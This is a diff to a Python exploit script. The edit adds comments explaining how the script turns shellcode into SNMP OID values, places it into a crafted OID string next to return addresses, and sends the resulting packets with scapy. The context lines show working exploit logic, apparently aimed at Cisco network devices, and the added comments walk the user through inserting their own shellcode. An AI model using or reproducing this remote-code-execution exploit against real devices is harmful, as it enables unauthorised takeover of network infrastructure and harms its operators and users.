@@ -23,7 +23,7 @@ try:
 except ImportError:
 	pass
 
-#defince bin2oid function
+#defince bin2oid function which will translate your shellcode from binary to oid values so snmp can read it
 def bin2oid(buf):
     #loop through the values in buf and unpack each one in unsigned character format ('B')
     #unpack outputs a tuple, call the first value in the tuple with [0]
@@ -39,7 +39,7 @@ def shift(s, offset):
     return res
 
 
-#set alps_oid variable to snmp string
+#set alps_oid variable to snmp string, the {} define where your shellcode will end up
 alps_oid = '1.3.6.1.4.1.9.9.95.1.3.1.1.7.108.39.84.85.195.249.106.59.210.37.23.42.103.182.75.232.81{0}{1}{2}{3}{4}{5}{6}{7}.14.167.142.47.118.77.96.179.109.211.170.27.243.88.157.50{8}{9}.35.27.203.165.44.25.83.68.39.22.219.77.32.38.6.115{10}{11}.11.187.147.166.116.171.114.126.109.248.144.111.30'
 #set shellcode_start variable to ascii characters with hex value
 shellcode_start = '\x80\x00\xf0\x00'
@@ -78,6 +78,8 @@ if __name__ == '__main__':
     for k, sh_dword in enumerate([sh_buf[i:i+4] for i in range(0, len(sh_buf), 4)]):
         s0 = bin2oid(sh_dword)  # shellcode dword
         #set below variables to ascii characters with hex value (reference string literals) and call bin2oid function
+        #this will be used to setup your shellcode, the bin2oid function is translating your shellcode from binary to oid values
+        #so snmp can read it
         s1 = bin2oid('\x00\x00\x00\x00')  
         s2 = bin2oid('\xBF\xC5\xB7\xDC')
         s3 = bin2oid('\x00\x00\x00\x00')
@@ -91,7 +93,7 @@ if __name__ == '__main__':
         ra_3 = bin2oid('\xBF\xC3\x86\xA0')
         
         #set payload variable to the value of alps_oid set previously in the code, and append the s0 etc variables into the
-        #spots of the alps_oid variable containing {0}{1}{2}{3}{4}{5}{6}{7} etc
+        #spots of the alps_oid variable containing {0}{1}{2}{3}{4}{5}{6}{7} etc, this will contain the shellcode you want
         payload = alps_oid.format(s0, s1, s2, s3, s4, s5, s6, ra, s0_2, ra_2, s0_3, ra_3)
         
         #send packet using scapy send module 
